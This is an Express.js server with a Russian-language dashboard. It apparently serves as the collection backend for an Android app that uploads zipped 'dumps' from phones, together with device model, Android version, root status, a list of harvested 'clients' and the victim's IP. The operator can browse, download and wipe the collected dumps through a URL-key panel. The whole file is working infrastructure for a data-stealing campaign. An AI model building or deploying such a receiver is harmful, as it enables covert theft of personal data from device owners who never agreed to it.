const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json({ limit: '10mb' }));

const PORT = process.env.PORT || 3000;

const UPLOAD_KEY = process.env.UPLOAD_KEY || 'change_me_upload';
const VIEW_KEY = process.env.VIEW_KEY || 'change_me_view';

const SAVE_DIR = path.join(__dirname, 'dumps');
const LOG_FILE = path.join(__dirname, 'logs.json');
if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR, { recursive: true });
if (!fs.existsSync(LOG_FILE)) fs.writeFileSync(LOG_FILE, '[]');

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, SAVE_DIR),
  filename: (req, file, cb) => cb(null, `dump_${Date.now()}.zip`)
});
const upload = multer({ storage, limits: { fileSize: 1024 * 1024 * 1024 } });

function readLogs() {
  try { return JSON.parse(fs.readFileSync(LOG_FILE, 'utf8')); } catch (e) { return []; }
}
function writeLogs(arr) {
  if (arr.length > 500) arr = arr.slice(-500);
  fs.writeFileSync(LOG_FILE, JSON.stringify(arr, null, 2));
}

// --- приём от APK ---
app.post('/upload', upload.single('file'), (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false, err: 'forbidden' });
  if (!req.file) return res.status(400).json({ ok: false, err: 'no file' });

  const meta = {
    device: req.headers['x-device'] || '?',
    android: req.headers['x-android'] || '?',
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
    ts: Date.now(),
    filename: req.file.filename,
    size: req.file.size
  };

  fs.writeFileSync(path.join(SAVE_DIR, req.file.filename + '.json'), JSON.stringify(meta));
  res.json({ ok: true, id: req.file.filename });
});

// --- приём логов ---
app.post('/log', (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const data = req.body || {};
  const entry = {
    ts: Date.now(),
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
    device: data.device || '?',
    android: data.android || '?',
    sdk: data.sdk || '?',
    root: data.root === true,
    clients: data.clients || [],
    zipSize: data.zipSize || 0,
    ok: data.ok === true,
    note: data.note || ''
  };

  const logs = readLogs();
  logs.push(entry);
  writeLogs(logs);

  res.json({ ok: true });
});

// --- панель ---
app.get('/', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');

  const tab = req.query.tab || 'dumps';

  const files = fs.readdirSync(SAVE_DIR)
    .filter(f => f.endsWith('.zip'))
    .map(f => {
      const metaPath = path.join(SAVE_DIR, f + '.json');
      const stat = fs.statSync(path.join(SAVE_DIR, f));
      let meta = { device: '?', android: '?', ip: '?', ts: stat.mtimeMs };
      if (fs.existsSync(metaPath)) {
        try { meta = JSON.parse(fs.readFileSync(metaPath, 'utf8')); } catch (e) {}
      }
      return { filename: f, size: stat.size, ...meta };
    })
    .sort((a, b) => b.ts - a.ts);

  const totalSize = files.reduce((s, f) => s + f.size, 0);
  const logs = readLogs().slice().reverse();

  const dumpCards = files.map((f, i) => `
    <div class="card" style="animation-delay:${Math.min(i * 30, 600)}ms">
      <div class="card-head">
        <div class="dot"></div>
        <div class="device">${f.device}</div>
        <div class="time">${new Date(f.ts).toLocaleString('ru-RU')}</div>
      </div>
      <div class="card-body">
        <div class="row"><span>Android</span><b>${f.android}</b></div>
        <div class="row"><span>Размер</span><b>${(f.size/1024/1024).toFixed(2)} MB</b></div>
        <div class="row"><span>IP</span><b>${f.ip}</b></div>
      </div>
      <div class="actions">
        <a class="btn" href="/download/${f.filename}?key=${VIEW_KEY}">Скачать</a>
        <a class="btn-del" href="/delete/${f.filename}?key=${VIEW_KEY}" onclick="return confirm('Удалить дамп?')">Удалить</a>
      </div>
    </div>`).join('');

  const logRows = logs.map(l => `
    <div class="log-row">
      <div class="log-time">${new Date(l.ts).toLocaleString('ru-RU')}</div>
      <div class="log-main">
        <div class="log-device">${l.device} <span class="log-android">Android ${l.android} (SDK ${l.sdk})</span></div>
        <div class="log-meta">
          <span class="${l.root ? 'ok' : 'bad'}">${l.root ? '🔓 root' : '🔒 no root'}</span>
          ${l.clients && l.clients.length ? `<span class="tag">${l.clients.join(' · ')}</span>` : ''}
          ${l.zipSize ? `<span class="tag">${(l.zipSize/1024/1024).toFixed(2)} MB</span>` : ''}
          ${l.ok ? `<span class="ok">✓ sent</span>` : `<span class="bad">✗ fail</span>`}
        </div>
        ${l.note ? `<div class="log-note">${l.note}</div>` : ''}
      </div>
      <div class="log-ip">${l.ip}</div>
    </div>`).join('');

  res.send(`<!doctype html>
<html lang="ru"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Panel</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
  background:radial-gradient(ellipse at top,#1a1f2e 0%,#0a0d14 60%);
  color:#e6edf3;min-height:100vh;padding:24px 16px 80px;
}
.header{max-width:1200px;margin:0 auto 22px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:14px}
.logo{display:flex;align-items:center;gap:12px;font-size:22px;font-weight:700;letter-spacing:-0.3px}
.logo-icon{
  width:38px;height:38px;border-radius:11px;
  background:linear-gradient(135deg,#58a6ff,#a371f7);
  display:grid;place-items:center;font-size:20px;
  box-shadow:0 0 28px rgba(88,166,255,.45);
}
.stats{display:flex;gap:10px;flex-wrap:wrap}
.stat{
  padding:8px 14px;border-radius:20px;
  background:rgba(88,166,255,.1);color:#58a6ff;
  border:1px solid rgba(88,166,255,.22);font-weight:600;font-size:13px;
}
.stat.warn{background:rgba(248,81,73,.1);color:#f85149;border-color:rgba(248,81,73,.22)}
.tabs{max-width:1200px;margin:0 auto 20px;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
.tab{
  padding:10px 18px;border-radius:10px;text-decoration:none;font-weight:600;font-size:14px;
  background:#161b22;border:1px solid #21262d;color:#8b949e;transition:all .2s;
}
.tab:hover{border-color:#58a6ff;color:#58a6ff}
.tab.active{background:rgba(88,166,255,.14);color:#58a6ff;border-color:rgba(88,166,255,.3)}
.spacer{flex:1}
.tool{
  padding:10px 16px;border-radius:10px;text-decoration:none;font-weight:600;font-size:13px;
  background:#161b22;border:1px solid #21262d;color:#f85149;transition:all .2s;
}
.tool:hover{border-color:#f85149}
.grid{
  max-width:1200px;margin:0 auto;
  display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px;
}
.empty{
  max-width:1200px;margin:0 auto;text-align:center;padding:100px 20px;
  color:#6e7681;
}
.empty-icon{font-size:64px;margin-bottom:18px;opacity:.4}
.card{
  background:linear-gradient(180deg,rgba(22,27,34,.92),rgba(13,17,23,.92));
  border:1px solid #21262d;border-radius:14px;padding:16px;
  transition:all .25s cubic-bezier(.4,0,.2,1);
  opacity:0;animation:fadeIn .4s forwards;
  display:flex;flex-direction:column;gap:14px;
}
.card:hover{border-color:#58a6ff;transform:translateY(-2px);box-shadow:0 10px 36px rgba(88,166,255,.15)}
@keyframes fadeIn{to{opacity:1}}
.card-head{display:flex;align-items:center;gap:8px;padding-bottom:12px;border-bottom:1px solid #21262d}
.dot{width:8px;height:8px;border-radius:50%;background:#3fb950;box-shadow:0 0 8px #3fb950;flex-shrink:0}
.device{font-weight:600;font-size:14px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.time{font-size:11px;color:#6e7681;flex-shrink:0}
.card-body{display:flex;flex-direction:column;gap:8px}
.row{display:flex;justify-content:space-between;font-size:13px}
.row span{color:#6e7681}
.row b{color:#e6edf3;font-weight:500;word-break:break-all;text-align:right;max-width:60%}
.actions{display:flex;gap:8px;margin-top:auto}
.btn,.btn-del{
  flex:1;text-align:center;padding:10px;border-radius:9px;
  text-decoration:none;font-weight:600;font-size:13px;transition:all .2s;
}
.btn{background:linear-gradient(135deg,#238636,#2ea043);color:#fff}
.btn:hover{filter:brightness(1.15);transform:scale(1.02)}
.btn-del{background:rgba(248,81,73,.12);color:#f85149;border:1px solid rgba(248,81,73,.25)}
.btn-del:hover{background:rgba(248,81,73,.2)}

.logs{max-width:1200px;margin:0 auto;display:flex;flex-direction:column;gap:10px}
.log-row{
  display:flex;gap:14px;align-items:center;
  background:linear-gradient(180deg,rgba(22,27,34,.92),rgba(13,17,23,.92));
  border:1px solid #21262d;border-radius:12px;padding:14px 16px;
  transition:all .2s;
}
.log-row:hover{border-color:#58a6ff}
.log-time{font-size:11px;color:#6e7681;min-width:135px}
.log-main{flex:1;display:flex;flex-direction:column;gap:5px}
.log-device{font-weight:600;font-size:14px}
.log-android{color:#6e7681;font-weight:400;font-size:12px;margin-left:6px}
.log-meta{display:flex;gap:8px;flex-wrap:wrap;font-size:12px}
.log-meta span{padding:2px 8px;border-radius:10px;background:#161b22;border:1px solid #21262d}
.log-meta .ok{color:#3fb950;border-color:rgba(63,185,80,.3)}
.log-meta .bad{color:#f85149;border-color:rgba(248,81,73,.3)}
.log-meta .tag{color:#58a6ff}
.log-note{font-size:12px;color:#8b949e;font-style:italic}
.log-ip{font-size:12px;color:#6e7681;font-family:monospace}
@media(max-width:600px){
  .log-row{flex-direction:column;align-items:flex-start;gap:6px}
  .log-time,.log-ip{min-width:0}
}
</style></head><body>

<div class="header">
  <div class="logo">
    <div class="logo-icon">⚡</div>
    <div>Panel</div>
  </div>
  <div class="stats">
    <div class="stat">${files.length} дампов</div>
    <div class="stat ${totalSize > 500*1024*1024 ? 'warn' : ''}">${(totalSize/1024/1024).toFixed(1)} MB</div>
    <div class="stat">${logs.length} логов</div>
  </div>
</div>

<div class="tabs">
  <a class="tab ${tab === 'dumps' ? 'active' : ''}" href="/?key=${VIEW_KEY}&tab=dumps">Дампы</a>
  <a class="tab ${tab === 'logs' ? 'active' : ''}" href="/?key=${VIEW_KEY}&tab=logs">Логи</a>
  <div class="spacer"></div>
  ${tab === 'dumps' 
    ? `<a class="tool" href="/clear?key=${VIEW_KEY}" onclick="return confirm('Удалить ВСЕ дампы?')">Очистить всё</a>` 
    : `<a class="tool" href="/clearlogs?key=${VIEW_KEY}" onclick="return confirm('Удалить все логи?')">Очистить логи</a>`}
</div>

${tab === 'logs' 
  ? (logs.length === 0 
      ? `<div class="empty"><div class="empty-icon">📋</div><div>Логов пока нет</div></div>` 
      : `<div class="logs">${logRows}</div>`)
  : (files.length === 0 
      ? `<div class="empty"><div class="empty-icon">📭</div><div>Пока пусто</div></div>` 
      : `<div class="grid">${dumpCards}</div>`)}

</body></html>`);
});

app.get('/delete/:name', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
  const p = path.join(SAVE_DIR, req.params.name);
  if (fs.existsSync(p)) fs.unlinkSync(p);
  const metaP = p + '.json';
  if (fs.existsSync(metaP)) fs.unlinkSync(metaP);
  res.redirect('/?key=' + VIEW_KEY);
});

app.get('/clear', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
  const files = fs.readdirSync(SAVE_DIR);
  for (const f of files) {
    try { fs.unlinkSync(path.join(SAVE_DIR, f)); } catch (e) {}
  }
  res.redirect('/?key=' + VIEW_KEY);
});

app.get('/clearlogs', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
  writeLogs([]);
  res.redirect('/?key=' + VIEW_KEY + '&tab=logs');
});

app.get('/download/:name', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
  const p = path.join(SAVE_DIR, req.params.name);
  if (!fs.existsSync(p)) return res.status(404).send('not found');
  res.download(p);
});

app.get('/health', (req, res) => res.send('ok'));

app.listen(PORT, () => console.log('server on ' + PORT));
